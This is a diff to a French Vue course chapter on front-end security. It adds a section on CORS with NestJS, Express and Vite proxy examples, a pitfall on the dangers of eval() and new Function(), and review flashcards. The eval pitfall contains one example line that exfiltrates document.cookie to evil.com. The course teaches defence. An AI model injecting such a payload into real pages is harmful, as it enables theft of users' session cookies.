@@ -1,7 +1,7 @@
 ---
 titre: Sécurité front
 cours: 02-vue
-notions: [XSS et échappement automatique Vue, dangers de v-html, CSRF et protection, Content Security Policy CSP, en-têtes de sécurité HTTP, dépendances et audit npm, secrets côté client, validation côté client vs serveur]
+notions: [XSS et échappement automatique Vue, dangers de v-html, CSRF et protection, Content Security Policy CSP, en-têtes de sécurité HTTP, dépendances et audit npm, secrets côté client, validation côté client vs serveur, CORS mécanisme et configuration serveur, eval et new Function dangers]
 outcomes:
   - sait expliquer comment Vue protège du XSS et quand v-html est dangereux
   - sait se protéger du CSRF et poser une CSP
@@ -351,6 +351,85 @@ export function useRegisterForm() {
 
 Le serveur doit reproduire les mêmes règles (souvent avec le même schéma Zod partagé via un package monorepo `@tribuzen/schemas`).
 
+### 2.10 CORS — Cross-Origin Resource Sharing
+
+**Mécanisme.** CORS est une politique de sécurité **enforced par le navigateur** : quand une page chargée depuis `http://localhost:5173` tente un `fetch` vers `http://localhost:3000`, le navigateur bloque la réponse par défaut si le serveur ne déclare pas explicitement que cette origine est autorisée.
+
+> CORS protège **l'utilisateur** (empêche un site malveillant de lire des données d'une autre origine en se servant du navigateur comme proxy). CORS **ne protège pas le serveur** — un attaquant avec `curl` contourne CORS car il n'est pas un navigateur.
+
+**Message d'erreur dev local classique (Vite 5173 → API 3000) :**
+
+```
+Access to fetch at 'http://localhost:3000/api/users'
+from origin 'http://localhost:5173' has been blocked by CORS policy:
+No 'Access-Control-Allow-Origin' header is present on the requested resource.
+```
+
+Ce message apparaît dans la console DevTools → onglet Console ou Network. La requête est visible dans l'onglet Network avec un statut CORS error — le serveur a bien reçu la requête (côté serveur le log apparaît), mais le navigateur bloque la réponse.
+
+**Pourquoi ça arrive :** Vite dev server (`5173`) et l'API (`3000`) ont des origines différentes. La Same-Origin Policy du navigateur bloque les réponses cross-origin sans header explicite.
+
+**Solution côté serveur :** configurer les headers CORS sur l'API. La correction se fait toujours côté serveur, jamais côté front (le front ne peut pas s'octroyer des permissions qu'il n'a pas).
+
+```ts
+// NestJS — @nestjs/platform-express
+// main.ts
+async function bootstrap() {
+  const app = await NestFactory.create(AppModule)
+
+  app.enableCors({
+    origin: ['http://localhost:5173', 'https://app.tribuzen.com'],
+    methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
+    credentials: true,   // Autorise l'envoi de cookies (requis pour CSRF cookie)
+  })
+
+  await app.listen(3000)
+}
+```
+
+```ts
+// Express — cors middleware
+import cors from 'cors'
+
+app.use(cors({
+  origin: (origin, callback) => {
+    const allowed = ['http://localhost:5173', 'https://app.tribuzen.com']
+    if (!origin || allowed.includes(origin)) callback(null, true)
+    else callback(new Error('CORS non autorisé'))
+  },
+  credentials: true,
+}))
+```
+
+**Headers CORS essentiels :**
+
+| Header (réponse serveur) | Rôle |
+|--------------------------|------|
+| `Access-Control-Allow-Origin` | Origines autorisées (`*` ou URL précise) |
+| `Access-Control-Allow-Methods` | Méthodes HTTP autorisées |
+| `Access-Control-Allow-Headers` | Headers que le client peut envoyer (ex: `Content-Type`, `X-XSRF-TOKEN`) |
+| `Access-Control-Allow-Credentials` | `true` si cookies/credentials doivent être envoyés |
+
+**Preflight (requête OPTIONS) :** pour les requêtes "non simples" (POST avec `Content-Type: application/json`, ou avec headers custom), le navigateur envoie d'abord une requête OPTIONS. Le serveur doit répondre avec les headers CORS avant que la vraie requête parte. NestJS et Express-cors gèrent cela automatiquement.
+
+**Contournement dev sans modifier le serveur :** configurer le proxy Vite :
+
+```ts
+// vite.config.ts — proxy : Vite fait les requêtes en son nom (même origine côté navigateur)
+export default defineConfig({
+  server: {
+    proxy: {
+      '/api': {
+        target: 'http://localhost:3000',
+        changeOrigin: true,
+      },
+    },
+  },
+})
+```
+
+Avec ce proxy, le front appelle `/api/users` (même origine `5173`) — Vite redirige vers `3000` sans CORS. **Ce contournement n'existe qu'en dev** — en production, l'API doit exposer les bons headers CORS.
+
 ---
 
 ## 3. Worked examples
@@ -481,7 +560,39 @@ async function submitPost(content: string) {
 
 Un attaquant peut envoyer la requête directement avec `curl` ou Burp Suite, contournant entièrement le front.
 
-### PIÈGE #4 — `'unsafe-inline'` dans `script-src` annule la CSP
+### PIÈGE #4 — `eval()` et `new Function()` — équivalents à `v-html` non sanitizé
+
+```ts
+// ❌ eval() exécute du code arbitraire dans le contexte de la page
+const userExpression = "fetch('https://evil.com?c='+document.cookie)"
+eval(userExpression)   // → vole les cookies si la chaîne vient de l'utilisateur
+
+// ❌ new Function() — idem, avec l'apparence d'un constructeur "sûr"
+const fn = new Function('return ' + userInput)
+fn()  // → exécute userInput comme JavaScript
+```
+
+Ces deux constructions sont l'équivalent exact d'un `v-html` non sanitizé : elles interprètent une chaîne comme du code exécutable. Le risque XSS est **identique** — si `userInput` vient de l'API ou d'un formulaire, n'importe quel payload JavaScript s'exécute avec les privilèges de la page.
+
+**Correct :** ne jamais passer de données utilisateur à `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`. Utiliser des alternatives sûres :
+
+```ts
+// ✅ Calculer une expression arithmétique simple sans eval
+import { evaluate } from 'mathjs'   // lib dédiée et sandboxée
+const result = evaluate('2 + 3 * 4')   // → 14, sans exec de code arbitraire
+
+// ✅ Exécuter une action selon un choix utilisateur → switch/map, pas eval
+const ACTIONS: Record<string, () => void> = {
+  save: () => save(),
+  cancel: () => cancel(),
+}
+const action = ACTIONS[userChoice]
+if (action) action()   // map typé, jamais eval
+```
+
+La CSP avec `script-src 'self'` bloque les scripts inline (`eval` contourne les CSP sans `'unsafe-eval'`) — ne jamais ajouter `'unsafe-eval'` à la CSP.
+
+### PIÈGE #5 — `'unsafe-inline'` dans `script-src` annule la CSP
 
 ```
 # ❌ Inutile — 'unsafe-inline' dans script-src autorise tous les scripts inline
@@ -546,6 +657,8 @@ Quelle directive CSP bloque les scripts inline sans 'unsafe-inline' ?|script-src
 Pourquoi une variable VITE_API_SECRET est-elle une faille de sécurité ?|Vite remplace import.meta.env.VITE_* par leurs valeurs au build — la valeur se retrouve en clair dans bundle.js téléchargé par tous les navigateurs. Les secrets ne doivent jamais avoir le préfixe VITE_.
 Quelle commande pnpm détecte les failles dans les dépendances et peut bloquer la CI ?|pnpm audit --audit-level=high — retourne un code d'erreur non-zéro si une vulnérabilité high ou critical est trouvée.
 Pourquoi la validation côté client ne remplace-t-elle pas la validation serveur ?|Le code JS s'exécute dans le navigateur de l'utilisateur qu'il contrôle. Il peut modifier les variables, désactiver le JS, ou envoyer la requête directement via curl/Burp Suite en contournant tout le front.
+Qu'est-ce que CORS et qui est chargé de le configurer ?|CORS (Cross-Origin Resource Sharing) est une politique enforced par le navigateur qui bloque les réponses cross-origin sans header explicite. Il se configure côté SERVEUR (Access-Control-Allow-Origin etc.) — le front ne peut pas s'octroyer des permissions qu'il n'a pas.
+Pourquoi eval() et new Function() sont-ils aussi dangereux que v-html non sanitizé ?|Ils interprètent une chaîne comme du code JavaScript exécutable dans le contexte de la page. Si la chaîne contient du contenu utilisateur, n'importe quel payload s'exécute avec les privilèges de la page — identique au risque XSS de v-html.
 ```
 
 ---
